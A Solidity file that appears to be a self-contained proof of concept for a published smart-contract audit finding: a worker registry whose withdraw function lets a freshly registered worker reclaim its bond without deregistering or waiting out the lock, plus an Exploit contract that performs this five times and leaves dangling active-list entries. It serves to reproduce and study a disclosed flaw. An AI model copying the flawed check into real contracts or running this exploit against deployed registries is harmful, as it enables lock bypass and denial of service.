// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Subsquid finding 58247 (H-03):
// "Workers could withdraw without deregister and waiting for the lock period".
//
// Audited source (Pashov Audit Group — Subsquid security review). The vulnerable
// `withdraw` function is reproduced VERBATIM from the finding's embedded snippet;
// the vulnerable line is marked @>:
//   contract  WorkerRegistration
//   fn        withdraw(bytes calldata peerId)
//   report    github.com/pashov/audits (Subsquid-security-review.md), H-03
//
// Root cause: the intended exit flow is deregister() (which sets
// `deregisteredAt` and removes the worker from `activeWorkerIds`) and THEN,
// after `lockPeriod()`, withdraw(). `withdraw` only enforces the lock with
// `block.number >= worker.deregisteredAt + lockPeriod()` (the @> line). A worker
// that has JUST registered is not yet active (its `registeredAt` is a future
// epoch), so `!isWorkerActive` passes; and because deregister was never called,
// `deregisteredAt == 0`, so the lock check degenerates to
// `block.number >= lockPeriod()` — trivially true at any real block height. The
// worker therefore withdraws its bond immediately, WITHOUT deregistering and
// WITHOUT serving the lock period, and — critically — is NEVER removed from the
// `activeWorkerIds` array. The dangling entry is the unbounded-loop / DoS vector
// the finding warns about, and the attacker leaves it there at zero net cost
// (the full bond is returned).
//
// The vulnerable `withdraw` is byte-for-byte the audited source. Everything it
// touches (`tSQD` ERC20, the `Worker` struct + storage, register/deregister,
// isWorkerActive, nextEpoch/lockPeriod, whenNotPaused, activeWorkerIds) is a
// faithful minimal double with real transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the tSQD bond token.
contract MiniToken {
    string public name = "Subsquid";
    string public symbol = "tSQD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Accounting-only marker token used to record the DoS harm magnitude
///      (the phantom active bond left dangling in `activeWorkerIds`). The
///      attacker's own bond is a wash (deposited then returned), so the harm is
///      minted to the SINK per the no-net-transfer convention.
contract GhostMarker {
    string public name = "Subsquid Ghost Active Bond";
    string public symbol = "GHOSTWRK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `withdraw` is reproduced VERBATIM from the audited
// source. register / deregister / isWorkerActive / nextEpoch / lockPeriod /
// whenNotPaused / activeWorkerIds are faithful doubles of the audited semantics.
// ─────────────────────────────────────────────────────────────────────────────
contract WorkerRegistration {
    struct Worker {
        address creator;
        bytes peerId;
        uint256 bond;
        uint128 registeredAt;
        uint128 deregisteredAt;
    }

    MiniToken public tSQD;
    uint256 public bondAmount;
    uint256 public epochLength;

    bool public paused;

    mapping(uint256 => Worker) public workers;
    mapping(bytes => uint256) public workerIds;
    uint256[] public activeWorkerIds; // the "active workers list" the finding refers to
    uint256 public workerIdTracker;

    event WorkerRegistered(uint256 indexed workerId, bytes peerId, address indexed creator);
    event WorkerDeregistered(uint256 indexed workerId, address indexed account);
    event WorkerWithdrawn(uint256 indexed workerId, address indexed account);

    modifier whenNotPaused() {
        require(!paused, "Pausable: paused");
        _;
    }

    constructor(MiniToken tSQD_, uint256 bondAmount_, uint256 epochLength_) {
        tSQD = tSQD_;
        bondAmount = bondAmount_;
        epochLength = epochLength_;
    }

    // ── faithful doubles for the surrounding (non-vulnerable) logic ──

    /// @dev Next epoch boundary in blocks — a freshly registered worker's
    ///      `registeredAt` is set to a FUTURE block, so it is not yet active.
    function nextEpoch() public view returns (uint128) {
        uint256 _epochLength = epochLength;
        return uint128((block.number / _epochLength + 1) * _epochLength);
    }

    /// @dev The lock a properly-deregistered worker must serve before withdraw.
    function lockPeriod() public view returns (uint256) {
        return epochLength;
    }

    /// @dev A worker is active once `registeredAt` is reached and until its
    ///      `deregisteredAt` epoch. A just-registered worker (future
    ///      registeredAt) is NOT active.
    function isWorkerActive(Worker storage worker) internal view returns (bool) {
        return worker.registeredAt <= block.number
            && (worker.deregisteredAt == 0 || worker.deregisteredAt >= block.number);
    }

    /// @notice Faithful register: pulls the bond, records the worker with a
    ///         future `registeredAt`, and adds it to `activeWorkerIds`.
    function register(bytes calldata peerId) external whenNotPaused {
        require(workerIds[peerId] == 0, "Worker already registered");
        workerIdTracker++;
        uint256 workerId = workerIdTracker;
        workers[workerId] = Worker({
            creator: msg.sender,
            peerId: peerId,
            bond: bondAmount,
            registeredAt: nextEpoch(),
            deregisteredAt: 0
        });
        workerIds[peerId] = workerId;
        activeWorkerIds.push(workerId);
        tSQD.transferFrom(msg.sender, address(this), bondAmount);
        emit WorkerRegistered(workerId, peerId, msg.sender);
    }

    /// @notice Faithful deregister — the INTENDED first step of the exit flow.
    ///         It removes the worker from `activeWorkerIds` and stamps
    ///         `deregisteredAt`, starting the lock clock. (Bypassed by the bug.)
    function deregister(bytes calldata peerId) external whenNotPaused {
        uint256 workerId = workerIds[peerId];
        require(workerId != 0, "Worker not registered");
        Worker storage worker = workers[workerId];
        require(isWorkerActive(worker), "Worker not active");
        require(worker.creator == msg.sender, "Not worker creator");

        worker.deregisteredAt = nextEpoch();

        uint256 len = activeWorkerIds.length;
        for (uint256 i = 0; i < len; i++) {
            if (activeWorkerIds[i] == workerId) {
                activeWorkerIds[i] = activeWorkerIds[len - 1];
                activeWorkerIds.pop();
                break;
            }
        }
        emit WorkerDeregistered(workerId, msg.sender);
    }

    /**
     * @dev Withdraws the bond of a worker.
     * @param peerId The unique peer ID of the worker.
     * @notice Worker must be inactive
     * @notice Worker must be registered by the caller
     * @notice Worker must be deregistered for at least lockPeriod
     */
    function withdraw(bytes calldata peerId) external whenNotPaused {
        uint256 workerId = workerIds[peerId];
        require(workerId != 0, "Worker not registered");
        Worker storage worker = workers[workerId];
        require(!isWorkerActive(worker), "Worker is active");
        require(worker.creator == msg.sender, "Not worker creator");
        require(block.number >= worker.deregisteredAt + lockPeriod(), "Worker is locked"); // @> VULN: deregisteredAt==0 when deregister was skipped, so the lock check is trivially satisfied and the worker is never removed from activeWorkerIds

        uint256 bond = worker.bond;
        delete workers[workerId];

        tSQD.transfer(msg.sender, bond);

        emit WorkerWithdrawn(workerId, msg.sender);
    }

    // ── views for the harness ──
    function activeWorkerCount() external view returns (uint256) {
        return activeWorkerIds.length;
    }

    function workerBond(uint256 workerId) external view returns (uint256) {
        return workers[workerId].bond;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: register K workers and IMMEDIATELY withdraw each one's bond,
// without ever calling deregister() and without serving the lock period. Prove:
//   (a) every bond is returned in the same block (net-zero token cost),
//   (b) every worker struct is deleted, yet
//   (c) all K entries remain dangling in activeWorkerIds — the unbounded-loop /
//       DoS vector, planted for free.
// The phantom active bond (K * bond) is minted to the SINK as the harm magnitude.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = address(0xD00d); // 0x000...0D00d

    MiniToken public tSQD;
    GhostMarker public marker;
    WorkerRegistration public vuln;

    uint256 internal constant GHOST_COUNT = 5;
    uint256 internal constant BOND = 100_000 ether; // Subsquid worker bond
    uint256 internal constant EPOCH_LENGTH = 100; // blocks

    uint256 public tokenCostToAttacker; // net tSQD the attacker actually spent
    uint256 public ghostEntries; // dangling activeWorkerIds entries left behind
    uint256 public phantomActiveBond; // harm magnitude minted to SINK

    constructor() {
        tSQD = new MiniToken(); // child nonce 1
        marker = new GhostMarker(); // child nonce 2
        vuln = new WorkerRegistration(tSQD, BOND, EPOCH_LENGTH); // child nonce 3 (VULN)
    }

    function run() external {
        // Fund the attacker with exactly the bonds it will post, and approve.
        tSQD.mint(address(this), GHOST_COUNT * BOND);
        tSQD.approve(address(vuln), type(uint256).max);

        uint256 balBefore = tSQD.balanceOf(address(this));

        for (uint256 i = 0; i < GHOST_COUNT; i++) {
            bytes memory peerId = abi.encodePacked("worker-", uint8(i));

            // 1) register: posts the bond, adds workerId to activeWorkerIds,
            //    sets registeredAt to a FUTURE epoch (worker not yet active).
            vuln.register(peerId);
            uint256 workerId = i + 1;

            // 2) withdraw IMMEDIATELY — no deregister, no lock wait. Passes
            //    because deregisteredAt==0 makes the lock check trivial.
            vuln.withdraw(peerId);

            // worker struct must be deleted (bond fully returned)...
            require(vuln.workerBond(workerId) == 0, "worker not deleted");
        }

        uint256 balAfter = tSQD.balanceOf(address(this));

        // (a) net-zero token cost: every bond came straight back.
        require(balAfter == balBefore, "attacker did not recover full bonds");
        tokenCostToAttacker = balBefore - balAfter; // == 0

        // (b)+(c) all K entries are still dangling in the active workers list,
        // even though every worker was withdrawn/deleted -> ghost entries.
        ghostEntries = vuln.activeWorkerCount();
        require(ghostEntries == GHOST_COUNT, "ghost entries were not left in activeWorkerIds");

        // record the DoS harm magnitude: phantom active bond the protocol still
        // believes is bonded/active, planted at zero net cost to the attacker.
        phantomActiveBond = GHOST_COUNT * BOND;
        marker.mint(SINK, phantomActiveBond);

        require(marker.balanceOf(SINK) == GHOST_COUNT * BOND, "harm magnitude not recorded");
    }
}
